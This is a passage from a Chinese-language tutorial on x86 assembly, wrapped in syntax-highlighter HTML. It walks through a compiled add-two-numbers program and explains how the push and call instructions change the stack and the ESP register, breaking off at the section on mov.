line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\n$ gcc -S example.c\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af0050160352-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af0050160352-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af0050160352-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631af0050160352-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af0050160352-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gcc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">c</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af0050160352-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面的命令执行以后，会生成一个文本文件<code>example.s</code>，里面就是汇编语言，包含了几十行指令。这么说吧，一个高级语言的简单操作，底层可能由几个，甚至几十个 CPU 指令构成。CPU 依次执行这些指令，完成这一步操作。</p>\n<p><code>example.s</code>经过简化以后，大概是下面的样子。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631af4895583883\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\n_add_a_and_b:\r\n   push   %ebx\r\n   mov    %eax, [%esp+8] \r\n   mov    %ebx, [%esp+12]\r\n   add    %eax, %ebx \r\n   pop    %ebx \r\n   ret  \r\n\r\n_main:\r\n   push   3\r\n   push   2\r\n   call   _add_a_and_b \r\n   add    %esp, 8\r\n   ret\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af4895583883-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af4895583883-16\">16</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-2\"><span class=\"crayon-v\">_add_a_and_b</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">ebx</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-4\"><span class=\"crayon-e\">   </span><span class=\"crayon-v\">mov</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">eax</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">esp</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">8</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-5\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">mov</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">ebx</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">esp</span><span class=\"crayon-o\">+</span><span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-6\"><span class=\"crayon-h\">   </span><span class=\"crayon-v\">add</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">eax</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">ebx </span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-7\"><span class=\"crayon-e\">   </span><span class=\"crayon-v\">pop</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-e\">ebx </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-8\"><span class=\"crayon-e\">   </span><span class=\"crayon-e\">ret  </span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-10\"><span class=\"crayon-v\">_main</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-11\"><span class=\"crayon-h\">   </span><span class=\"crayon-i\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-12\"><span class=\"crayon-h\">   </span><span class=\"crayon-i\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-13\"><span class=\"crayon-h\">   </span><span class=\"crayon-e\">call   </span><span class=\"crayon-e\">_add_a_and_b </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-14\"><span class=\"crayon-e\">   </span><span class=\"crayon-v\">add</span><span class=\"crayon-h\">    </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">esp</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af4895583883-15\"><span class=\"crayon-h\">   </span><span class=\"crayon-i\">ret</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af4895583883-16\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0016 seconds] -->\r\n<p>\n</p></blockquote>\n<p>可以看到，原程序的两个函数<code>add_a_and_b</code>和<code>main</code>，对应两个标签<code>_add_a_and_b</code>和<code>_main</code>。每个标签里面是该函数所转成的 CPU 运行流程。</p>\n<p>每一行就是 CPU 执行的一次操作。它又分成两部分，就以其中一行为例。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631af7765026219\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\npush   %ebx\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af7765026219-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631af7765026219-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631af7765026219-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631af7765026219-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631af7765026219-2\"><span class=\"crayon-v\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">ebx</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631af7765026219-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p>这一行里面，<code>push</code>是 CPU 指令，<code>%ebx</code>是该指令要用到的运算子。一个 CPU 指令可以有零个到多个运算子。</p>\n<p>下面我就一行一行讲解这个汇编程序，建议读者最好把这个程序，在另一个窗口拷贝一份，省得阅读的时候再把页面滚动上来。</p>\n<h3>7.2 push 指令</h3>\n<p>根据约定，程序从<code>_main</code>标签开始执行，这时会在 Stack 上为<code>main</code>建立一个帧，并将 Stack 所指向的地址，写入 ESP 寄存器。后面如果有数据要写入<code>main</code>这个帧，就会写在 ESP 寄存器所保存的地址。</p>\n<p>然后，开始执行第一行代码。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631afb943608656\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\npush   3\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631afb943608656-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631afb943608656-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631afb943608656-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631afb943608656-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631afb943608656-2\"><span class=\"crayon-i\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">3</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631afb943608656-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p><code>push</code>指令用于将运算子放入 Stack，这里就是将<code>3</code>写入<code>main</code>这个帧。</p>\n<p>虽然看上去很简单，<code>push</code>指令其实有一个前置操作。它会先取出 ESP 寄存器里面的地址，将其减去4个字节，然后将新地址写入 ESP 寄存器。使用减法是因为 Stack 从高位向低位发展，4个字节则是因为<code>3</code>的类型是<code>int</code>，占用4个字节。得到新地址以后， 3 就会写入这个地址开始的四个字节。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631afe029049857\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\npush   2\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631afe029049857-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631afe029049857-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631afe029049857-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631afe029049857-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631afe029049857-2\"><span class=\"crayon-i\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631afe029049857-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p>第二行也是一样，<code>push</code>指令将<code>2</code>写入<code>main</code>这个帧，位置紧贴着前面写入的<code>3</code>。这时，ESP 寄存器会再减去 4个字节（累计减去8）。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/deef5de3fddb527578e216f5bae7f88d.png\" alt=\"\"></p>\n<h3>7.3 call 指令</h3>\n<p>第三行的<code>call</code>指令用来调用函数。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b02283016606\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\ncall   _add_a_and_b\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b02283016606-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b02283016606-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b02283016606-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b02283016606-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b02283016606-2\"><span class=\"crayon-e\">call   </span><span class=\"crayon-v\">_add_a_and</span><span class=\"crayon-sy\">_</span>b</div><div class=\"crayon-line\" id=\"crayon-5a6f385631b02283016606-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p>上面的代码表示调用<code>add_a_and_b</code>函数。这时，程序就会去找<code>_add_a_and_b</code>标签，并为该函数建立一个新的帧。</p>\n<p>下面就开始执行<code>_add_a_and_b</code>的代码。</p>\n<blockquote><p>\n</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f385631b05403222360\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n\r\npush   %ebx\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b05403222360-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f385631b05403222360-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f385631b05403222360-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f385631b05403222360-1\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f385631b05403222360-2\"><span class=\"crayon-v\">push</span><span class=\"crayon-h\">   </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">ebx</span></div><div class=\"crayon-line\" id=\"crayon-5a6f385631b05403222360-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>\n</p></blockquote>\n<p>这一行表示将 EBX 寄存器里面的值，写入<code>_add_a_and_b</code>这个帧。这是因为后面要用到这个寄存器，就先把里面的值取出来，用完后再写回去。</p>\n<p>这时，<code>push</code>指令会再将 ESP 寄存器里面的地址减去4个字节（累计减去12）。</p>\n<h3>7.4 mov 